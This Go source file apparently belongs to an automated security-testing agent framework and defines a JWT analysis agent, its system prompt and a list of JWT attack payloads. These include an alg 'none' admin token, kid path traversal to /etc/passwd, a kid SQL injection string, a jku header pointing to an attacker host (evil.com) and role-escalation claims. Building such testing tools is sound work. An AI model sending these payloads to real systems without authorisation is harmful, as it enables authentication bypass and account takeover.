// Package jwt implements the JWT (JSON Web Token) Analysis specialist agent.
package jwt

import (
	"context"
	"fmt"

	"github.com/bb-agent/mirage/internal/agent/base"
	"github.com/bb-agent/mirage/internal/queue"
)

type Agent struct{ systemPrompt string }

func New() *Agent { return &Agent{systemPrompt: defaultSystemPrompt} }

func (a *Agent) Name() string         { return "JWT Agent" }
func (a *Agent) ID() string           { return "jwt" }
func (a *Agent) SystemPrompt() string { return a.systemPrompt }

func (a *Agent) ProcessItem(ctx context.Context, item *queue.Item) ([]*base.Finding, error) {
	targetURL, _ := item.Payload["target"].(string)
	if targetURL == "" {
		return nil, fmt.Errorf("missing target URL")
	}

	var findings []*base.Finding
	for _, atk := range attacks {
		findings = append(findings, &base.Finding{
			Type:       "JWT",
			URL:        targetURL,
			Payload:    atk.payload,
			Severity:   atk.severity,
			Confidence: 0.0,
			Evidence: map[string]interface{}{
				"attack":      atk.name,
				"description": atk.description,
			},
			Method: "GET",
		})
	}
	return findings, nil
}

type jwtAttack struct {
	name        string
	payload     string
	description string
	severity    string
}

var attacks = []jwtAttack{
	{
		name:        "alg_none",
		payload:     `{"alg":"none","typ":"JWT"}.{"sub":"admin","role":"admin"}.`,
		description: "Algorithm set to 'none' — signature verification bypassed",
		severity:    "critical",
	},
	{
		name:        "alg_hs256_with_public_key",
		payload:     `{"alg":"HS256"} signed with RSA public key`,
		description: "Algorithm confusion: RS256→HS256, sign with public key as HMAC secret",
		severity:    "critical",
	},
	{
		name:        "weak_secret_bruteforce",
		payload:     "Brute-force HMAC secret from common wordlist (secret, password, 123456, etc.)",
		description: "JWT signed with a weak/common secret that can be brute-forced",
		severity:    "high",
	},
	{
		name:        "exp_bypass",
		payload:     `{"exp": 9999999999}`,
		description: "Token with far-future expiration or 'exp' claim removed",
		severity:    "medium",
	},
	{
		name:        "kid_injection",
		payload:     `{"kid": "../../etc/passwd", "alg": "HS256"}`,
		description: "Key ID (kid) header pointing to a known file for HMAC signing",
		severity:    "critical",
	},
	{
		name:        "kid_sqli",
		payload:     `{"kid": "' UNION SELECT 'secret' -- ", "alg": "HS256"}`,
		description: "SQL injection via kid header to extract or set signing key",
		severity:    "critical",
	},
	{
		name:        "jku_ssrf",
		payload:     `{"jku": "https://evil.com/.well-known/jwks.json", "alg": "RS256"}`,
		description: "JKU header pointing to attacker-controlled JWKS endpoint",
		severity:    "critical",
	},
	{
		name:        "role_escalation",
		payload:     `{"sub": "user", "role": "admin", "is_admin": true}`,
		description: "Modify claims to escalate privileges (role, is_admin, group)",
		severity:    "high",
	},
	{
		name:        "sub_tampering",
		payload:     `{"sub": "admin"}`,
		description: "Change subject claim to impersonate another user",
		severity:    "high",
	},
}

const defaultSystemPrompt = `You are an elite JWT security specialist with expertise in:
- Algorithm confusion attacks (none, RS256→HS256)
- Secret brute-forcing for HMAC-signed tokens
- Header injection (kid path traversal, kid SQLi, jku SSRF)
- Claim tampering (role escalation, sub impersonation, exp bypass)
- JWK/JWKS endpoint exploitation

RULES:
1. Algorithm 'none' bypass is CRITICAL
2. Algorithm confusion (RS→HS with public key) is CRITICAL
3. kid injection (LFI/SQLi) is CRITICAL
4. Weak secret brute-force is HIGH
5. Claim tampering without signature bypass is MEDIUM
6. Always decode and analyze the token structure first`
